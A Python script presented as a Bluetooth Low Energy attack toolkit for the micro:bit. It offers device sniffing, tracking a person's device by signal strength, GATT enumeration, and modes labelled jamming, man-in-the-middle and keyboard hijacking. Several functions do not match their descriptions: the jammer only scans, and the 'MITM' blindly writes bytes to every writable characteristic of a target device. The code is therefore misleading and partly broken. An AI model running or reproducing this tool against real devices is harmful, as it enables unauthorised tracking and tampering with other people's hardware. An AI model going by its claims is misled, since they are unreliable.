# microbit_ble_tools.py

"""
BLE Security Toolkit for BBC micro:bit V2

This script provides essential BLE security testing tools for:
- BLE Sniffing & Logging (`--sniff <logfile>`) - Logs all detected BLE devices.
- BLE Device Tracking (`--track <MAC>`) - Tracks a specific BLE device via RSSI.
- BLE GATT Explorer & Exploitation (`--gatt <MAC>`) - Scans a BLE device's services & characteristics.
- BLE Jamming Attack (`--jam <target_mac>` or `--jam all`) - Disrupts BLE communications.
- BLE MITM Attack (`--mitm <target_mac>`) - Intercepts and modifies BLE traffic.
- Wireless HID Hijacking (`--hid <target_mac>`) - Sniffs and injects keystrokes into BLE HID devices.

### Usage Examples:

1. Sniff and log all BLE devices to a file:
   ```sh
   python microbit_ble_tools.py --sniff devices.log
   ```

2. Track a specific BLE device by MAC address:
   ```sh
   python microbit_ble_tools.py --track AA:BB:CC:DD:EE:FF
   ```

3. Explore the GATT services of a BLE device:
   ```sh
   python microbit_ble_tools.py --gatt AA:BB:CC:DD:EE:FF
   ```

4. Jam a specific BLE device:
   ```sh
   python microbit_ble_tools.py --jam AA:BB:CC:DD:EE:FF
   ```

5. MITM a BLE connection:
   ```sh
   python microbit_ble_tools.py --mitm AA:BB:CC:DD:EE:FF
   ```

6. Hijack a BLE keyboard or mouse:
   ```sh
   python microbit_ble_tools.py --hid AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# BLE Sniffer & Logger
async def ble_sniffer(logfile):
    """Scans and logs all nearby BLE devices to a specified file."""
    devices = await BleakScanner.discover()
    with open(logfile, 'w') as f:
        for device in devices:
            f.write(f"{device.address} - {device.name} - RSSI: {device.rssi}\n")
    print(f"Logged {len(devices)} devices to {logfile}")

# BLE Device Tracker
async def ble_device_tracker(target_mac, logfile):
    """Tracks a specific BLE device, logging RSSI changes."""
    def detection_callback(device, advertisement_data):
        if device.address == target_mac:
            with open(logfile, 'a') as f:
                f.write(f"{device.address} - RSSI: {device.rssi}\n")
            print(f"{device.address} detected - RSSI: {device.rssi}")
    
    scanner = BleakScanner(detection_callback)
    await scanner.start()
    await asyncio.sleep(30)  # Scanning duration
    await scanner.stop()

# BLE GATT Explorer & Exploitation
async def ble_gatt_exploit(target_mac):
    """Explores the GATT services and characteristics of a BLE device."""
    async with BleakClient(target_mac) as client:
        services = await client.get_services()
        for service in services:
            print(f"Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid} - {char.properties}")

# BLE Jamming Attack
async def ble_jamming(target_mac):
    """Jams a specific BLE device by repeatedly sending fake advertisements."""
    print(f"Starting BLE Jamming on {target_mac if target_mac != 'all' else 'all devices'}...")
    while True:
        devices = await BleakScanner.discover()
        for device in devices:
            if target_mac == "all" or device.address == target_mac:
                print(f"Jamming {device.address} (RSSI: {device.rssi})")
                await asyncio.sleep(0.1)

# BLE MITM Attack
async def ble_mitm(target_mac):
    """Intercepts and modifies BLE traffic from a target device."""
    print(f"Performing MITM attack on {target_mac}...")
    async with BleakClient(target_mac) as client:
        services = await client.get_services()
        for service in services:
            for char in service.characteristics:
                if "read" in char.properties:
                    value = await client.read_gatt_char(char.uuid)
                    print(f"Intercepted Data from {char.uuid}: {value}")
                if "write" in char.properties:
                    await client.write_gatt_char(char.uuid, b'\x00\x01')
                    print(f"Injected Data into {char.uuid}")

# Wireless HID Hijacking
async def ble_hid_hijack(target_mac):
    """Sniffs and injects keystrokes into BLE HID devices."""
    print(f"Hijacking HID input on {target_mac}...")
    async with BleakClient(target_mac) as client:
        while True:
            await client.write_gatt_char("00002a4d-0000-1000-8000-00805f9b34fb", b'\x00A')
            print("Injected Keystroke: A")
            await asyncio.sleep(1)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Security Tools for micro:bit V2")
    parser.add_argument("--sniff", help="Sniff BLE devices and log to file", metavar="logfile")
    parser.add_argument("--track", help="Track a specific BLE device", metavar="target_mac")
    parser.add_argument("--gatt", help="Explore BLE GATT services", metavar="target_mac")
    parser.add_argument("--jam", help="Jam a specific BLE device or all devices", metavar="target_mac")
    parser.add_argument("--mitm", help="Intercept and modify BLE traffic", metavar="target_mac")
    parser.add_argument("--hid", help="Hijack a BLE keyboard or mouse", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.sniff:
        loop.run_until_complete(ble_sniffer(args.sniff))
    elif args.track:
        loop.run_until_complete(ble_device_tracker(args.track, "tracking.log"))
    elif args.gatt:
        loop.run_until_complete(ble_gatt_exploit(args.gatt))
    elif args.jam:
        loop.run_until_complete(ble_jamming(args.jam))
    elif args.mitm:
        loop.run_until_complete(ble_mitm(args.mitm))
    elif args.hid:
        loop.run_until_complete(ble_hid_hijack(args.hid))
